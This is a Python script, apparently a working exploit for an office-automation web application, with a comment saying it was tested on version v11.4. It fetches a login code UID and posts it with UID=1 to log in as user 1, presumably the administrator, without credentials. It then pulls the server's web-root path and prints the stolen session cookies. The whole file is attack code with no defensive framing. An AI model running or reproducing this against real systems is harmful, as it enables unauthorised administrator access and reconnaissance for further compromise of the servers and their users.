#! /usr/bin/env python3
# -*- coding: utf-8 -*-

'''
@  已测试通过版本： v11.4
@  https://www.github.com/zrools/tools/python
'''

import requests, re

session = requests.Session()

oa_addr = 'http://192.168.0.3:8080'

headers = {
        'Accept-Encoding' : 'gzip, deflate',
        'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36'
    }


def login():
    login_url = '{}/logincheck_code.php'.format(oa_addr)
    login_code_url = '{}/general/login_code.php?codeuid=1'.format(oa_addr)
    
    login_headers = headers
    login_headers['X-Requested-With'] = 'XMLHttpRequest'
    login_headers['Content-Type'] = 'application/x-www-form-urlencoded; charset=UTF-8'
    
    res = session.get(login_code_url)
    code_uid = res.text.strip()[-40:-2]

    login_data = 'UID=1&CODEUID={}'.format(code_uid)

    res = session.post(login_url, data=login_data, headers=login_headers)
        
    if '"status":1' in res.text:
        return True
    
    return False


def get_path():
    url = '{}/general/system/security/service.php'.format(oa_addr)
    
    res = session.get(url, headers=headers)
    
    web_path = ''
    # 避免正则报错
    for i in res.text.split("\n"):
        if 'WEBROOT' in i:
            web_path = i.split('"')[-4]
    
    return web_path.replace('\\', '\\\\')
    

def main():
    
    if not login():
        print('login error.')
        return False
    
    web_path = get_path()
    print('webroot: ', web_path)
    
    cookies = ';'.join([k + '=' + v for k, v in session.cookies.items()])
    print('cookies: ', cookies)


if __name__ == '__main__':
    main()
